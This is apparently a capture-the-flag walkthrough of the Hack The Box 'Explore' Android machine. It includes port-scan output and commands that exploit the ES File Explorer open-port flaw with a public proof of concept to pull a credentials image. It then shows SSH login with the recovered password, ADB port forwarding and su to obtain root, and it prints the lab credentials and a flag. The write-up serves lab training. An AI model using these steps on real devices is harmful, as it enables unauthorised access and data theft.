+++
title = "HTB - Explore"
date = 2024-10-08
+++

### Scan
```
./nmapAutomator.sh 10.10.10.247 All

Running all scans on 10.10.10.247

Host is likely running Linux
                                                                                                                                                                                             
                                                                                                                                                                                             
---------------------Starting Port Scan-----------------------                                                                                                                               
                                                                                                                                                                                             


PORT     STATE SERVICE
2222/tcp open  EtherNetIP-1



---------------------Starting Script Scan-----------------------
                                                                                                                                                                                             


PORT     STATE SERVICE VERSION
2222/tcp open  ssh     (protocol 2.0)
| ssh-hostkey: 
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-SSH Server - Banana Studio




---------------------Starting Full Scan------------------------
                                                                                                                                                                                             


PORT      STATE SERVICE
2222/tcp  open  EtherNetIP-1
45567/tcp open  unknown
59777/tcp open  unknown



Making a script scan on extra ports: 45567, 59777
                                                                                                                                                                                             


PORT      STATE SERVICE VERSION
45567/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 08 Oct 2024 21:43:11 GMT
|     Content-Length: 22
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|   GetRequest: 
|     HTTP/1.1 412 Precondition Failed
|     Date: Tue, 08 Oct 2024 21:43:11 GMT
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.0 501 Not Implemented
|     Date: Tue, 08 Oct 2024 21:43:16 GMT
|     Content-Length: 29
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Method not supported: OPTIONS
|   Help: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 08 Oct 2024 21:43:32 GMT
|     Content-Length: 26
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: HELP
|   RTSPRequest: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 08 Oct 2024 21:43:16 GMT
|     Content-Length: 39
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     valid protocol version: RTSP/1.0
|   SSLSessionReq: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 08 Oct 2024 21:43:32 GMT
|     Content-Length: 73
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|     ?G???,???`~?
|     ??{????w????<=?o?
|   TLSSessionReq: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 08 Oct 2024 21:43:32 GMT
|     Content-Length: 71
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|     ??random1random2random3random4
|   TerminalServerCookie: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 08 Oct 2024 21:43:32 GMT
|     Content-Length: 54
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|_    Cookie: mstshash=nmap
59777/tcp open  http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn't have a title (text/plain).
```
### Enum
nmap thinks that 59777 is a minecraft server, but having done work with Bukkit in the past, I doubt that's the case. I did research to find out more about the port, and stumbled on ES File Explorer. I'm assuming this is our poe.
Theres a git repo https://github.com/fs0c131y/ESFileExplorerOpenPortVuln.git
we can peruse with `python3 poc.py --cmd list[Files,Pics,etc.] --host 10.10.10.247`
<img alt="Image" async src="images/Screenshot 2024-10-08 at 7.22.00 PM.png" width="800px"></img>
creds jpg. grab it `python3 poc.py --get-file /storage/emulated/0/DCIM/creds.jpg --host 10.10.10.247`
<img alt="Image" async src="images/Screenshot 2024-10-08 at 7.23.50 PM.png" width="800px"></img>
creds ;??<img alt="Image" async src="images/Screenshot 2024-10-08 at 7.24.22 PM.png" width="800px"></img> `kristi:Kr1sT!5h@Rp3xPl0r3!`
ssh in `ssh kristi@10.10.10.247 -p 2222`
dir structure <img alt="Image" async src="images/Screenshot 2024-10-08 at 7.27.01 PM.png" width="800px"></img>
Going back to where photo was in `storage/emulated/0` we find user
USER: f32017174c7c7e8f50c6da52891ae250

### Priv Esc
we can see what ports are active with `netstat -tnlp`
we see 5555, which didnt show in our scans. and through research, this is a port for android debugging.
we can reconnect with the port forwarded to our machine using SSH 
`ssh -L 5555:localhost:5555 kristi@10.10.10.247 -p 2222`
<img alt="Image" async src="images/Screenshot 2024-10-08 at 7.47.55 PM.png" width="800px"></img>
Then, on our machine again, `apt install adb` will give us the tools to interact with the software
`adb devices`
connect to the forwarded port `adb connect localhost:5555`
Drop a shell there`adb -s localhost:5555 shell`
We can abuse privileges by using `su` and `find / name root.txt 2>/dev/null` to locate the flag.
<img alt="Image" async src="images/Screenshot 2024-10-08 at 7.48.13 PM.png" width="800px"></img>